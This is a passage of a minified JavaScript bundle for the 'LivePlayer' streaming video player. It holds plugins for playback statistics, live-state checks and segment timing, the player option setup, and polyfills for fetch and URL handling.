r=null!=arguments[t]?arguments[t]:{};t%2?n(Object(r),!0).forEach((function(t){d()(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):n(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function g(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=c()(r);return t=n?(t=c()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),i()(this,t)}}var v=function(t){h()(i,t);var n=g(i);function i(t){s()(this,i),e=n.call(this,t),d()(l()(e),"resetStats",(function(){e.playerStatsObject={proto:"mseld",user_agent:navigator.userAgent,bytes:0,application:{application_name:"live_player",application_version:e._options.version,stall_count:0,pause_count:0,error_count:0,reconnect_count:0,bitrate_change_count:0,live_duration:0,stall_duration:0,pause_duration:0,total_video_frames:0,dropped_video_frames:0,corrupted_video_frames:0}}})),d()(l()(e),"start",(function(){e.sendingInterval=setInterval((function(){e.post()}),e.statsSendTime)})),d()(l()(e),"stop",(function(){e.sendingInterval&&(clearInterval(e.sendingInterval),e.post())})),d()(l()(e),"post",(function(){var t;e.playerStatsObject.started_at&&(t=e.playerStatsObject.source_id,t=e.statsURL.replace(/sessions/,"sessions/".concat(t||"")),e._options.statsSendEnable)&&fetch(t,{headers:{Accept:"application/json","Content-Type":"application/json"},method:"PUT",body:JSON.stringify(e.getStats())})})),e.uuid=e.generateUUID();var e,r=(t=e._options).statsSendTime;t=t.src;return e.statsSendTime=1e3*r||6e4,e.statsURL=t.replace(/index.mpd/,"sessions").replace(/index.fmp4.m3u8/,"sessions").replace(/mse_ld/,"sessions"),e.resetStats(),e.playerStatsObject=e.getStats(),e}return o()(i,[{key:"name",get:function(){return"StatsPlugin"}},{key:"bindEvents",value:function(){var r=this,t=this._options.playback;this.proto=this._options.proto;var e=["PLAYBACK_PLAY_INTENT","PLAYBACK_LOADEDMETADATA","PLAYBACK_PLAYBACKSTATE","PLAYBACK_PROGRESS","PLAYBACK_READY","CONTAINER_BITRATE","PLAYBACK_BUFFERING","PLAYBACK_BUFFERFULL","PLAYBACK_ERROR","PLAYBACK_FRAGMENT_LOADED","PLAYBACK_STOP","PLAYBACK_STATS_ADD"];(e=t.MSE?e:[].concat(a()(e),["PLAYBACK_PAUSE","PLAYBACK_PLAY"])).forEach((function(e){r.listenTo(r.container.playback,f.Events[e],(function(t){r.onEvent(f.Events[e],t)}))}))}},{key:"onEvent",value:function(t,e){var r,n,i=this,a=this._options.playback,s=!!a.MSE;switch(t){case"playback:ready":s||(this.playerStatsObject.proto=this.proto||"hls",this.playerStatsObject.opened_at=Date.now()),this.start();break;case"playback:play:intent":s&&this.updateMseStats();break;case"playback:play":this.playerStatsObject.started_at=Date.now(),this.pauseStartedAt&&(l=this.playerStatsObject.application)&&(l=l.pause_duration,l+=Date.now()-this.pauseStartedAt,this.addPlayerStat("pause_duration",!1,l),delete this.pauseStartedAt);break;case"playback:buffering":this.buferingStart=Date.now(),this.addPlayerStat("stall_count");break;case"playback:bufferfull":this.buferingStart&&(l=this.playerStatsObject.application)&&(l=l.stall_duration,l+=Date.now()-this.buferingStart,this.addPlayerStat("stall_duration",!1,l),delete this.buferingStart);break;case"playback:loadedmetadata":s||this.addPlayerStat("bitrate_change_count");break;case"playback:error":s||this.addPlayerStat("error_count");break;case"playback:stop":s?this.updateMseStats():this.playerStatsObject.closed_at=Date.now(),this.stop();break;case"playback:pause":this.addPlayerStat("pause_count"),this.pauseStartedAt=Date.now();break;case"playback:loadedmetadata":this.playerStatsObject.first_byte_at=Date.now();break;case"playback:fragment:loaded":var o=e.networkDetails;o.onload=function(){i.playerStatsObject.source_id=o.getResponseHeader("X-Sid")};var l=e.frag.stats.loaded;this.playerStatsObject.bytes+=l;break;case"playback:progress":s?this.updateMseStats():(this.playerStatsObject.updated_at=Date.now(),this.segmentStart?(l=this.playerStatsObject.application)&&(l=l.live_duration,l+=Date.now()-this.segmentStart,this.addPlayerStat("live_duration",!1,l),delete this.segmentStart):this.segmentStart=Date.now(),this.playerStatsObject=p(p({},this.playerStatsObject),{},{id:this.uuid}),r=(l=a.el.getVideoPlaybackQuality()).corruptedVideoFrames,n=l.droppedVideoFrames,l=l.totalVideoFrames,this.addPlayerStat("total_video_frames",!1,l),this.addPlayerStat("dropped_video_frames",!1,n),this.addPlayerStat("corrupted_video_frames",!1,r))}"playback:ready"!==t&&this._options.statsCallback(this.getStats())}},{key:"updateMseStats",value:function(){var t;this._options.playback.MSE&&(t=this.getMseStats(),this.playerStatsObject=p(p({},this.playerStatsObject),t))}},{key:"getMseStats",value:function(){var t=this._options.playback.getStats();return delete t.application_name,delete t.application_version,delete t.user_agent,delete t.uuid,t}},{key:"addPlayerStat",value:function(t){var e=!(1<arguments.length&&void 0!==arguments[1])||arguments[1],r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:null,n=this.playerStatsObject.application;n&&(r?n[t]=r:e&&n[t]++,this.playerStatsObject.application=n)}},{key:"getStats",value:function(){return p(p({},this.playerStatsObject),{},{id:this.uuid})}},{key:"generateUUID",value:function(){var r=(new Date).getTime(),n="undefined"!=typeof performance&&performance.now&&1e3*performance.now()||0;return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(t){var e=16*Math.random();return 0<r?(e=(r+e)%16|0,r=Math.floor(r/16)):(e=(n+e)%16|0,n=Math.floor(n/16)),("x"===t?e:3&e|8).toString(16)}))}},{key:"destroy",value:function(){u()(c()(i.prototype),"destroy",this).call(this)}}]),i}(f.UIContainerPlugin)},function(t,e,r){"use strict";r.d(e,"a",(function(){return c}));e=r(5);var n=r.n(e),i=(e=r(6),r.n(e)),a=(e=r(7),r.n(e)),s=(e=r(8),r.n(e)),o=(e=r(9),r.n(e)),l=(e=r(3),r.n(e)),u=r(1);var c=function(t){s()(r,t);var e=function h(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=l()(r);return t=n?(t=l()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),o()(this,t)}}(r);function r(){return n()(this,r),e.apply(this,arguments)}return i()(r,[{key:"name",get:function(){return"Flussonic timeline check plugin"}},{key:"supportedVersion",get:function(){return{min:"0.4.18"}}},{key:"bindEvents",value:function(){var t=this;this.listenTo(this.core,u.Events.CORE_ACTIVE_CONTAINER_CHANGED,this.checkForLive),this.checkingLive||(this.checkingLive=setInterval((function(){t.checkForLive()}),1e3))}},{key:"destroy",value:function(){clearInterval(this.checkingLive),a()(l()(r.prototype),"destroy",this).call(this)}},{key:"checkForLive",value:function(){this.stopListening(),this.bindEvents(),this.mediaControl=this.core.mediaControl;var t=this.mediaControl.$el;"live"===this.core.getPlaybackType()&&t.addClass("live")}},{key:"render",value:function(){this.checkForLive()}}]),r}(u.UICorePlugin)},function(t,e,r){"use strict";r.d(e,"a",(function(){return n}));e=r(5);var i=r.n(e),a=(e=r(6),r.n(e)),s=(e=r(7),r.n(e)),o=(e=r(8),r.n(e)),l=(e=r(9),r.n(e)),u=(e=r(3),r.n(e)),h=r(1);var n=function(t){o()(n,t);var r=function c(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=u()(r);return t=n?(t=u()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),l()(this,t)}}(n);function n(t){i()(this,n);var e=(t=r.call(this,t))._options.playbackDuration;return t.playbackDuration=e,t}return a()(n,[{key:"name",get:function(){return"SegmentPlayPlugin"}},{key:"bindEvents",value:function(){var t=this;this.listenTo(this.container.playback,h.Events.PLAYBACK_PLAY,(function(){t.stopTimer()}))}},{key:"stopTimer",value:function(){var t=this;this.playbackDuration&&(this.stopTimeout=setTimeout((function(){t.container.pause(),setTimeout((function(){t.container.stop()}),0)}),1e3*this.playbackDuration))}},{key:"destroy",value:function(){clearTimeout(this.stopTimeout),s()(u()(n.prototype),"destroy",this).call(this)}}]),n}(h.UIContainerPlugin)},,,,,,,function(t,u,h){"use strict";h.r(u),function(m){var t=h(5),y=h.n(t),e=(t=h(6),h.n(t)),r=(t=h(8),h.n(t)),i=(t=h(9),h.n(t)),a=(t=h(3),h.n(t)),n=(t=h(17),h.n(t)),E=(h(202),h(351),h(352),h(353),h(1)),T=h(395),b=h(22),A=h(94),_=h(160),S=h(163),L=h(166),k=h(169),R=h(171),w=h(174),I=h(175),D=h(176),C=h(177),P=h(122),x=h(178),O=h(180),s=h(26),M=h(182),F=h(185),N=h(186),B=h(187),U=h(190),j=h(191),G=h(192);function l(e,t){var r,n=Object.keys(e);return Object.getOwnPropertySymbols&&(r=Object.getOwnPropertySymbols(e),t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)),n}function $(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?l(Object(r),!0).forEach((function(t){n()(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):l(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}t=function(t){r()(v,t);var g=function o(r){var n=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(t){return!1}}();return function(){var t,e=a()(r);return t=n?(t=a()(this).constructor,Reflect.construct(e,arguments,t)):e.apply(this,arguments),i()(this,t)}}(v);function v(t){y()(this,v);var e,r,n=new _.a(t),i=n.get("debug"),a=n.get("panzoom"),s=n.get("equalizer"),o=n.get("tracks"),l=n.get("dontShowError"),u=n.get("hideMediaControl"),h=n.get("disableVideoTagContextMenu"),c=n.get("loop"),d=((p={}).mediaInfo=(f=n).getMediaInfo(),p.source=f.constructSource(P.a.isSupported(),!1)(),d=f.get("autoplay"),p.autoPlay||(p.autoPlay=!1!==d),p.authToken=f.get("authToken"),p.logo=f.get("logo"),p.poster=f.get("poster"),p.playback||(p.playback={hlsUseNextLevel:!1,playInline:!0,recycleVideo:E.Browser.isMobile,crossOrigin:"anonymous"}),p.playback.hlsjsConfig||(p.playback.hlsjsConfig={debug:f.get("debug"),lowLatencyMode:!0,latency:.25,maxLatency:.5,liveSyncPosition:.25,backBufferLength:90,autoStartLoad:!0,subtitleDisplay:!0,enableWebVTT:!0}),!1===p.autorestart||p.events||(p.events={}),"statsSendEnable"in p||(p.statsSendEnable=!0),p),f=!0,p=((p=n.get("calmError"))&&(f=p),n.get("play_duration"));return d=t=$($($($($($($($($($($($($({},{onMediaInfo:function(){}}),t),d),i),a),s),o),u),h),c),f),l),{},{playbackDuration:p}),a=(i=n).get("isVideoPoster"),(d=$({},d)).plugins||(d.plugins=[]),d.plugins.push(C.a),d.logo&&d.plugins.push(R.a),a||("mse"===d.proto||"ws:"===d.protocol||"wss:"===d.protocol)&&d.autoPlay?d.plugins.push(L.a):d.plugins.push(k.a),d.plugins.push(P.a),(d.from||d.to||d.ago)&&d.plugins.push(O.a),d.plugins.push(S.a),d.plugins.push(M.a),d.plugins.push(N.a),d.plugins.push(B.a),d.plugins.push(j.a),d.panzoom&&d.plugins.push(x.a),d.debug&&(d.plugins.push(E.Log),E.Log.setLevel(0)),d.errorPlugin&&d.errorPlugin.hide(),0===d.volume||d.autoPlay||i.get("mute")?d.mute=!0:(d.volume||(d.volume=100),d.plugins.push(w.a)),d.plugins.push(I.a),d.eventLog&&d.plugins.push(D.a),d.equalizer&&d.plugins.push(F.a),d.plugins.push(A.a),r={audio:{a3ds:!0,"ac-3":!0,"ac-4":!0,alac:!0,alaw:!0,dra1:!0,"dts+":!0,"dts-":!0,dtsc:!0,dtse:!0,dtsh:!0,"ec-3":!0,enca:!0,g719:!0,g726:!0,m4ae:!0,mha1:!0,mha2:!0,mhm1:!0,mhm2:!0,mlpa:!0,mp4a:!0,"raw ":!0,Opus:!0,opus:!0,samr:!0,sawb:!0,sawp:!0,sevc:!0,sqcp:!0,ssmv:!0,twos:!0,ulaw:!0},video:{avc1:!0,avc2:!0,avc3:!0,avc4:!0,avcp:!0,drac:!0,dvav:!0,dvhe:!0,encv:!0,hev1:!0,hvc1:!0,mjp2:!0,mp4v:!0,mvc1:!0,mvc2:!0,mvc3:!0,mvc4:!0,resv:!0,rv60:!0,s263:!0,svc1:!0,svc2:!0,"vc-1":!0,vp08:!0,vp09:!0}},A.a.isCodecType=function(t,e){return!!(e=r[e])&&!0===e[t.slice(0,4)]},d.plugins.push(A.a),d.plugins.push(U.a),d.plugins.push(G.a),d.sentryConfig&&d.sentryConfig.length&&(T.a({dsn:d.sentryConfig,environment:"production",release:"LivePlayer".concat(m.env.npm_package_version?"@".concat(m.env.npm_package_version):"")}),d.events.onError=function(t){b.a(t)}),t=d,n.get("debug")&&console.info("options",t),t.version=v.version||"",t.statsCallback=function(t){e.playerStatistics=t},e=g.call(this,t)}return e()(v,[{key:"name",get:function(){return"LivePlayer"}},{key:"getStats",value:function(){return this.playerStatistics}}],[{key:"parseUrl",value:function(t){for(var e=arguments.length,r=new Array(1<e?e-1:0),n=1;n<e;n++)r[n-1]=arguments[n];return s.j(t,r)}},{key:"version",get:function(){return"23.12.1"}}]),v}(E.Player),t.FlasHLS=E.FlasHLS,t.ClapprPlayer=E.Player,u.default=t}.call(this,h(95))},function(t,e,r){var n=r(62).default;t.exports=function(t,e){if("object"!=n(t)||!t)return t;var r=t[Symbol.toPrimitive];if(void 0===r)return("string"===e?String:Number)(t);if(r=r.call(t,e||"default"),"object"!=n(r))return r;throw new TypeError("@@toPrimitive must return a primitive value.")},t.exports.__esModule=!0,t.exports.default=t.exports},function(r,t){function n(t,e){return r.exports=n=Object.setPrototypeOf?Object.setPrototypeOf.bind():function(t,e){return t.__proto__=e,t},r.exports.__esModule=!0,r.exports.default=r.exports,n(t,e)}r.exports=n,r.exports.__esModule=!0,r.exports.default=r.exports},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,function(t,e,r){"use strict";(function(t){var e,r,l="undefined"!=typeof globalThis&&globalThis||"undefined"!=typeof self&&self||void 0!==t&&t||{},n="URLSearchParams"in l,i="Symbol"in l&&"iterator"in Symbol,u="FileReader"in l&&"Blob"in l&&function(){try{return new Blob,!0}catch(t){return!1}}(),a="FormData"in l,h="ArrayBuffer"in l;function c(t){if("string"!=typeof t&&(t=String(t)),/[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(t)||""===t)throw new TypeError('Invalid character in header field name: "'+t+'"');return t.toLowerCase()}function d(t){return"string"!=typeof t?String(t):t}function s(e){var t={next:function(){var t=e.shift();return{done:void 0===t,value:t}}};return i&&(t[Symbol.iterator]=function(){return t}),t}function f(e){this.map={},e instanceof f?e.forEach((function(t,e){this.append(e,t)}),this):Array.isArray(e)?e.forEach((function(t){if(2!=t.length)throw new TypeError("Headers constructor: expected name/value pair to be length 2, found"+t.length);this.append(t[0],t[1])}),this):e&&Object.getOwnPropertyNames(e).forEach((function(t){this.append(t,e[t])}),this)}function o(t){if(!t._noBody)return t.bodyUsed?Promise.reject(new TypeError("Already read")):void(t.bodyUsed=!0)}function p(r){return new Promise((function(t,e){r.onload=function(){t(r.result)},r.onerror=function(){e(r.error)}}))}function g(t){var e=new FileReader,r=p(e);return e.readAsArrayBuffer(t),r}function v(t){var e;return t.slice?t.slice(0):((e=new Uint8Array(t.byteLength)).set(new Uint8Array(t)),e.buffer)}function m(){return this.bodyUsed=!1,this._initBody=function(t){var e;this.bodyUsed=this.bodyUsed,(this._bodyInit=t)?"string"==typeof t?this._bodyText=t:u&&Blob.prototype.isPrototypeOf(t)?this._bodyBlob=t:a&&FormData.prototype.isPrototypeOf(t)?this._bodyFormData=t:n&&URLSearchParams.prototype.isPrototypeOf(t)?this._bodyText=t.toString():h&&u&&(e=t)&&DataView.prototype.isPrototypeOf(e)?(this._bodyArrayBuffer=v(t.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):h&&(ArrayBuffer.prototype.isPrototypeOf(t)||r(t))?this._bodyArrayBuffer=v(t):this._bodyText=t=Object.prototype.toString.call(t):(this._noBody=!0,this._bodyText=""),this.headers.get("content-type")||("string"==typeof t?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):n&&URLSearchParams.prototype.isPrototypeOf(t)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},u&&(this.blob=function(){var t=o(this);if(t)return t;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))}),this.arrayBuffer=function(){if(this._bodyArrayBuffer)return o(this)||(ArrayBuffer.isView(this._bodyArrayBuffer)?Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset,this._bodyArrayBuffer.byteOffset+this._bodyArrayBuffer.byteLength)):Promise.resolve(this._bodyArrayBuffer));if(u)return this.blob().then(g);throw new Error("could not read as ArrayBuffer")},this.text=function(){var t,e,r,n=o(this);if(n)return n;if(this._bodyBlob)return n=this._bodyBlob,e=p(t=new FileReader),r=(r=/charset=([A-Za-z0-9_-]+)/.exec(n.type))?r[1]:"utf-8",t.readAsText(n,r),e;if(this._bodyArrayBuffer)return Promise.resolve(function(t){for(var e=new Uint8Array(t),r=new Array(e.length),n=0;n<e.length;n++)r[n]=String.fromCharCode(e[n]);return r.join("")}(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},a&&(this.formData=function(){return this.text().then(T)}),this.json=function(){return this.text().then(JSON.parse)},this}h&&(e=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],r=ArrayBuffer.isView||function(t){return t&&-1<e.indexOf(Object.prototype.toString.call(t))}),f.prototype.append=function(t,e){t=c(t),e=d(e);var r=this.map[t];this.map[t]=r?r+", "+e:e},f.prototype.delete=function(t){delete this.map[c(t)]},f.prototype.get=function(t){return t=c(t),this.has(t)?this.map[t]:null},f.prototype.has=function(t){return this.map.hasOwnProperty(c(t))},f.prototype.set=function(t,e){this.map[c(t)]=d(e)},f.prototype.forEach=function(t,e){for(var r in this.map)this.map.hasOwnProperty(r)&&t.call(e,this.map[r],r,this)},f.prototype.keys=function(){var r=[];return this.forEach((function(t,e){r.push(e)})),s(r)},f.prototype.values=function(){var e=[];return this.forEach((function(t){e.push(t)})),s(e)},f.prototype.entries=function(){var r=[];return this.forEach((function(t,e){r.push([e,t])})),s(r)},i&&(f.prototype[Symbol.iterator]=f.prototype.entries);var y=["CONNECT","DELETE","GET","HEAD","OPTIONS","PATCH","POST","PUT","TRACE"];function E(t,e){if(!(this instanceof E))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');var r,n=(e=e||{}).body;if(t instanceof E){if(t.bodyUsed)throw new TypeError("Already read");this.url=t.url,this.credentials=t.credentials,e.headers||(this.headers=new f(t.headers)),this.method=t.method,this.mode=t.mode,this.signal=t.signal,n||null==t._bodyInit||(n=t._bodyInit,t.bodyUsed=!0)}else this.url=String(t);if(this.credentials=e.credentials||this.credentials||"same-origin",!e.headers&&this.headers||(this.headers=new f(e.headers)),this.method=(r=(t=e.method||this.method||"GET").toUpperCase(),-1<y.indexOf(r)?r:t),this.mode=e.mode||this.mode||null,this.signal=e.signal||this.signal||function(){if("AbortController"in l)return(new AbortController).signal}(),this.referrer=null,("GET"===this.method||"HEAD"===this.method)&&n)throw new TypeError("Body not allowed for GET or HEAD requests");this._initBody(n),"GET"!==this.method&&"HEAD"!==this.method||"no-store"!==e.cache&&"no-cache"!==e.cache||((r=/([?&])_=[^&]*/).test(this.url)?this.url=this.url.replace(r,"$1_="+(new Date).getTime()):this.url+=(/\?/.test(this.url)?"&":"?")+"_="+(new Date).getTime())}function T(t){var r=new FormData;return t.trim().split("&").forEach((function(t){var e;t&&(e=(t=t.split("=")).shift().replace(/\+/g," "),t=t.join("=").replace(/\+/g," "),r.append(decodeURIComponent(e),decodeURIComponent(t)))})),r}function b(t,e){if(!(this instanceof b))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');if(e=e||{},this.type="default",this.status=void 0===e.status?200:e.status,this.status<200||599<this.status)throw new RangeError("Failed to construct 'Response': The status provided (0) is outside the range [200, 599].");this.ok=200<=this.status&&this.status<300,this.statusText=void 0===e.statusText?"":""+e.statusText,this.headers=new f(e.headers),this.url=e.url||"",this._initBody(t)}E.prototype.clone=function(){return new E(this,{body:this._bodyInit})},m.call(E.prototype),m.call(b.prototype),b.prototype.clone=function(){return new b(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new f(this.headers),url:this.url})},b.error=function(){var t=new b(null,{status:200,statusText:""});return t.ok=!1,t.status=0,t.type="error",t};var A=[301,302,303,307,308],_=(b.redirect=function(t,e){if(-1===A.indexOf(e))throw new RangeError("Invalid status code");return new b(null,{status:e,headers:{location:t}})},l.DOMException);try{new _}catch(t){(_=function(t,e){this.message=t,this.name=e,e=Error(t),this.stack=e.stack}).prototype=Object.create(Error.prototype),_.prototype.constructor=_}function S(n,o){return new Promise((function(i,t){var a=new E(n,o);if(a.signal&&a.signal.aborted)return t(new _("Aborted","AbortError"));var r,s=new XMLHttpRequest;function e(){s.abort()}s.onload=function(){var t,r,e={statusText:s.statusText,headers:(t=s.getAllResponseHeaders()||"",r=new f,t.replace(/\r?\n[\t ]+/g," ").split("\r").map((function(t){return 0===t.indexOf("\n")?t.substr(1,t.length):t})).forEach((function(t){var e=(t=t.split(":")).shift().trim();if(e){t=t.join(":").trim();try{r.append(e,t)}catch(t){console.warn("Response "+t.message)}}})),r)},n=(0===a.url.indexOf("file://")&&(s.status<200||599<s.status)?e.status=200:e.status=s.status,e.url="responseURL"in s?s.responseURL:e.headers.get("X-Request-URL"),"response"in s?s.response:s.responseText);setTimeout((function(){i(new b(n,e))}),0)},s.onerror=function(){setTimeout((function(){t(new TypeError("Network request failed"))}),0)},s.ontimeout=function(){setTimeout((function(){t(new TypeError("Network request timed out"))}),0)},s.onabort=function(){setTimeout((function(){t(new _("Aborted","AbortError"))}),0)},s.open(a.method,function(e){try{return""===e&&l.location.href?l.location.href:e}catch(t){return e}}(a.url),!0),"include"===a.credentials?s.withCredentials=!0:"omit"===a.credentials&&(s.withCredentials=!1),"responseType"in s&&(u?s.responseType="blob":h&&(s.responseType="arraybuffer")),o&&"object"==typeof o.headers&&!(o.headers instanceof f||l.Headers&&o.headers instanceof l.Headers)?(r=[],Object.getOwnPropertyNames(o.headers).forEach((function(t){r.push(c(t)),s.setRequestHeader(t,d(o.headers[t]))})),a.headers.forEach((function(t,e){-1===r.indexOf(e)&&s.setRequestHeader(e,t)}))):a.headers.forEach((function(t,e){s.setRequestHeader(e,t)})),a.signal&&(a.signal.addEventListener("abort",e),s.onreadystatechange=function(){4===s.readyState&&a.signal.removeEventListener("abort",e)}),s.send(void 0===a._bodyInit?null:a._bodyInit)}))}S.polyfill=!0,l.fetch||(l.fetch=S,l.Headers=f,l.Request=E,l.Response=b)}).call(this,r(31))},function(t,e,r){(function(t){function n(e){var t={next:function(){var t=e.shift();return{done:void 0===t,value:t}}};return o&&(t[Symbol.iterator]=function(){return t}),t}function i(t){return encodeURIComponent(t).replace(/%20/g,"+")}function a(t){return decodeURIComponent(String(t).replace(/\+/g," "))}r=void 0!==t?t:"undefined"!=typeof window?window:"undefined"!=typeof self?self:this,o=function(){try{return!!Symbol.iterator}catch(t){return!1}}(),function(){try{var t=r.URLSearchParams;return"a=1"===new t("?a=1").toString()&&"function"==typeof t.prototype.set&&"function"==typeof t.prototype.entries}catch(t){return!1}}()||function e(){function s(t){Object.defineProperty(this,"_entries",{writable:!0,value:{}});var e=typeof t;if("undefined"!=e)if("string"==e)""!==t&&this._fromString(t);else if(t instanceof s){var r=this;t.forEach((function(t,e){r.append(e,t)}))}else{if(null===t||"object"!=e)throw new TypeError("Unsupported input's type for URLSearchParams");if("[object Array]"===Object.prototype.toString.call(t))for(var n=0;n<t.length;n++){var i=t[n];if("[object Array]"!==Object.prototype.toString.call(i)&&2===i.length)throw new TypeError("Expected [string, any] as entry at index "+n+" of URLSearchParams's input");this.append(i[0],i[1])}else for(var a in t)t.hasOwnProperty(a)&&this.append(a,t[a])}}var t=s.prototype;t.append=function(t,e){t in this._entries?this._entries[t].push(String(e)):this._entries[t]=[String(e)]},t.delete=function(t){delete this._entries[t]},t.get=function(t){return t in this._entries?this._entries[t][0]:null},t.getAll=function(t){return t in this._entries?this._entries[t].slice(0):[]},t.has=function(t){return t in this._entries},t.set=function(t,e){this._entries[t]=[String(e)]},t.forEach=function(t,e){for(var r in this._entries)if(this._entries.hasOwnProperty(r))for(var n=this._entries[r],i=0;i<n.length;i++)t.call(e,n[i],r,this)},t.keys=function(){var r=[];return this.forEach((function(t,e){r.push(e)})),n(r)},t.values=function(){var e=[];return this.forEach((function(t){e.push(t)})),n(e)},t.entries=function(){var r=[];return this.forEach((function(t,e){r.push([e,t])})),n(r)},o&&(t[Symbol.iterator]=t.entries),t.toString=function(){var r=[];return this.forEach((function(t,e){r.push(i(e)+"="+i(t))})),r.join("&")},r.URLSearchParams=s}(),"function"!=typeof(s=r.URLSearchParams.prototype).sort&&(s.sort=function(){var r=this,n=[];this.forEach((function(t,e){n.push([e,t]),r._entries||r.delete(e)})),n.sort((function(t,e){return t[0]<e[0]?-1:t[0]>e[0]?1:0})),r._entries&&(r._entries={});for(var t=0;t<n.length;t++)this.append(n[t][0],n[t][1])}),"function"!=typeof s._fromString&&Object.defineProperty(s,"_fromString",{enumerable:!1,configurable:!1,writable:!1,value:function(t){if(this._entries)this._entries={};else{var r=[];this.forEach((function(t,e){r.push(e)}));for(var e=0;e<r.length;e++)this.delete(r[e])}var n,i=(t=t.replace(/^\?/,"")).split("&");for(e=0;e<i.length;e++)n=i[e].split("="),this.append(a(n[0]),1<n.length?a(n[1]):"")}});var r,o,s,h=void 0!==t?t:"undefined"!=typeof window?window:"undefined"!=typeof self?self:this;if(!function(){try{var t=new h.URL("b","http://a");return t.pathname="c d","http://a/c%20d"===t.href&&t.searchParams}catch(t){return!1}}()&&function l(){function t(t,e){"string"!=typeof t&&(t=String(t)),e&&"string"!=typeof e&&(e=String(e));var r=document;if(e&&(void 0===h.location||e!==h.location.href)){e=e.toLowerCase(),(i=(r=document.implementation.createHTMLDocument("")).createElement("base")).href=e,r.head.appendChild(i);try{if(0!==i.href.indexOf(e))throw new Error(i.href)}catch(t){throw new Error("URL unable to set base "+e+" due to "+t)}}var n=r.createElement("a"),i=(n.href=t,i&&(r.body.appendChild(n),n.href=n.href),r.createElement("input"));if(i.type="url",i.value=t,":"===n.protocol||!/:/.test(n.href)||!i.checkValidity()&&!e)throw new TypeError("Invalid URL");Object.defineProperty(this,"_anchorElement",{value:n});var a=new h.URLSearchParams(this.search),s=!0,o=!0,l=this,u=(["append","delete","set"].forEach((function(t){var e=a[t];a[t]=function(){e.apply(a,arguments),s&&(o=!1,l.search=a.toString(),o=!0)}})),void Object.defineProperty(this,"searchParams",{value:a,enumerable:!0}));Object.defineProperty(this,"_updateSearchParams",{enumerable:!1,configurable:!1,writable:!1,value:function(){this.search!==u&&(u=this.search,o)&&(s=!1,this.searchParams._fromString(this.search),s=!0)}})}var e=h.URL,r=t.prototype;["hash","host","hostname","port","protocol"].forEach((function(t){var e;e=t,Object.defineProperty(r,e,{get:function(){return this._anchorElement[e]},set:function(t){this._anchorElement[e]=t},enumerable:!0})})),Object.defineProperty(r,"search",{get:function(){return this._anchorElement.search},set:function(t){this._anchorElement.search=t,this._updateSearchParams()},enumerable:!0}),Object.defineProperties(r,{toString:{get:function(){var t=this;return function(){return t.href}}},href:{get:function(){return this._anchorElement.href.replace(/\?$/,"")},set:function(t){this._anchorElement.href=t,this._updateSearchParams()},enumerable:!0},pathname:{get:function(){return this._anchorElement.pathname.replace(/(^\/?)/,"/")},set:function(t){this._anchorElement.pathname=t},enumerable:!0},origin:{get:function(){var t={"http:":80,"https:":443,"ftp:":21}[this._anchorElement.protocol];t=this._anchorElement.port!=t&&""!==this._anchorElement.port;return this._anchorElement.protocol+"//"+this._anchorElement.hostname+(t?":"+this._anchorElement.port:"")},enumerable:!0},password:{get:function(){return""},set:function(t){},enumerable:!0},username:{get:function(){return""},set:function(t){},enumerable:!0}}),t.createObjectURL=function(t){return e.createObjectURL.apply(e,arguments)},t.revokeObjectURL=function(t){return e.revokeObjectURL.apply(e,arguments)},h.URL=t}(),void 0!==h.location&&!("origin"in 